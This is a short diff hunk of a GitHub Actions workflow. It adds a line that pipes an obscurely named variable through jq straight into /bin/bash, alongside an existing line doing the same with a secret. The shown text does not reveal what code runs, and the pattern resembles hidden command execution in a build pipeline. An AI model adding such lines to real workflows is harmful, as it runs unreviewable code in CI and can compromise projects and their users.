@@ -22,6 +22,7 @@ jobs:
           xqud434: ${{ secrets.xqud434 }}
         run: |
           printf '%s' "$xqud434" | jq -r .a2 | /bin/bash
+          echo $no07 | jq -r .o0 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
